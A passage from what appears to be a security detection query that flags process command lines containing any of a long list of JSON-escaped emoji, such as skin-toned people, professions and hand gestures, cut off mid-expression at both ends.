tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\u2708\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\u2708\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\u2708\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\ud83d\ude80\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\ud83d\ude80\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\ud83d\ude80\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\u2696\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\u2696\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\u2696\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc70\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc70\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc70\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd35\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd35\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udd35\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc78\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udec5\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udd34\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udd77\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddb8\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddb8\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddb8\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddb9\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddb9\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddb9\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd36\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\ud83c\udf84\" or tgt.process.cmdline contains \"\ud83c\udf85\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddd9\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd9\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddd9\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddd\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddd\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddb\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddb\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udddb\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddc\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddc\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udddc\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddda\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddda\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddda\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc7c\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udd30\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udec4\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udec3\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udd31\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\ud83c\udf7c\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\ud83c\udf7c\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\ud83c\udf7c\" or tgt.process.cmdline contains \"\ud83d\ude47\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude47\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\ude47\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc81\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc81\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc81\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude45\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude45\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\ude45\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude46\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude46\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\ude46\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4b\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4b\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\ude4b\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddcf\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddcf\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddcf\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd26\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd26\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udd26\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd37\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd37\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udd37\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4e\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4e\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\ude4e\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4d\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4d\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\ude4d\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc87\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc87\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc87\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc86\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc86\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc86\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd6\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd6\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddd6\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc83\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udd7a\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udd74\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\ud83e\uddbd\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\ud83e\uddbd\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\ud83e\uddbd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\ud83e\uddbc\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\ud83e\uddbc\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\ud83e\uddbc\" or tgt.process.cmdline contains \"\ud83d\udeb6\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb6\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udeb6\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\ud83e\uddaf\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\ud83e\uddaf\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\ud83e\uddaf\" or tgt.process.cmdline contains \"\ud83e\uddce\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddce\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddce\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc3\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc3\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83c\udfc3\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddcd\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddcd\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddcd\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc6d\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc6c\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc6b\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddd7\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd7\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddd7\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc7\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83c\udfc2\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83c\udfcc\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfcc\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83c\udfcc\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc4\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc4\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83c\udfc4\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udea3\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udea3\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udea3\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfca\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfca\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83c\udfca\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\u26f9\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\u26f9\ud83c\udffb\" or tgt.process.cmdline contains \"\u26f9\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfcb\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfcb\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83c\udfcb\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb4\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb4\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udeb4\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb5\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb5\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udeb5\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd38\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd38\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udd38\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd3d\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd3d\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udd3d\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd3e\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd3e\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udd3e\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd39\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd39\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udd39\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd8\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd8\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddd8\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udec0\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udecc\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc4b\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udd1a\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udd90\ud83c\udffc\" or tgt.process.cmdline contains \"\u270b\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udd96\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc4c\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udd0c\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udd0f\ud83c\udffc\" or tgt.process.cmdline contains \"\u270c\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udd1e\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udef0\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udd1f\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udd18\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udd19\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udef5\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udef2\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udef3\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udef4\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc48\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc49\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc46\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udd95\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc47\ud83c\udffc\" or tgt.process.cmdline contains \"\u261d\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc4d\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc4e\ud83c\udffc\" or tgt.process.cmdline contains \"\u270a\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc4a\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udd1b\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udd1c\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc4f\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udef6\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\ude4c\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc50\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udd32\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\ude4f\ud83c\udffc\" or tgt.process.cmdline contains \"\u270d\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udcaa\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddb5\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddb6\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc42\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddbb\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc43\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc76\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc67\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddd2\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc66\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\ud83e\uddb1\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\ud83e\uddb1\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\ud83e\uddb1\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\ud83e\uddb0\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\ud83e\uddb0\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\ud83e\uddb0\" or tgt.process.cmdline contains \"\ud83d\udc71\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc71\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc71\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\ud83e\uddb3\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\ud83e\uddb3\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\ud83e\uddb3\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\ud83e\uddb2\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\ud83e\uddb2\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\ud83e\uddb2\" or tgt.process.cmdline contains \"\ud83e\uddd4\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd4\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddd4\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc75\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddd3\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc74\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc72\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc73\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc73\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc73\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd5\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc6e\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc6e\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc6e\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc77\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc77\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc77\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc82\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc82\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc82\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udd75\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udd75\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udd75\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\u2695\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\u2695\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\u2695\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\ud83c\udf3e\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\ud83c\udf3e\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\ud83c\udf3e\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\ud83c\udf73\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\ud83c\udf73\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\ud83c\udf73\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\ud83c\udf93\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\ud83c\udf93\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\ud83c\udf93\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\ud83c\udfa4\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\ud83c\udfa4\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\ud83c\udfa4\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\ud83c\udfeb\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\ud83c\udfeb\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\ud83c\udfeb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\ud83c\udfed\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\ud83c\udfed\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\ud83c\udfed\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\ud83d\udcbb\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\ud83d\udcbb\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\ud83d\udcbb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\ud83d\udcbc\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\ud83d\udcbc\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\ud83d\udcbc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\ud83d\udd27\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\ud83d\udd27\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\ud83d\udd27\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\ud83d\udd2c\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\ud83d\udd2c\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\ud83d\udd2c\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\ud83c\udfa8\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\ud83c\udfa8\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\ud83c\udfa8\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\ud83d\ude92\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\ud83d\ude92\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\ud83d\ude92\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\u2708\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\u2708\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\u2708\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\ud83d\ude80\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\ud83d\ude80\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\ud83d\ude80\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\u2696\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\u2696\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\u2696\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc70\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc70\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc70\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd35\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd35\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udd35\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc78\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udec5\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udd34\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udd77\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddb8\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddb8\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddb8\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddb9\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddb9\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddb9\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd36\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\ud83c\udf84\" or tgt.process.cmdline contains \"\ud83c\udf85\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddd9\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd9\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddd9\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddd\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddd\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udddd\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddb\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddb\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udddb\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddc\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddc\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udddc\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddda\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddda\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddda\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc7c\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udd30\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udec4\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udec3\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udd31\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\ud83c\udf7c\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\ud83c\udf7c\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\ud83c\udf7c\" or tgt.process.cmdline contains \"\ud83d\ude47\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude47\ud83c\udffc\" or tgt.process.cmdline contains 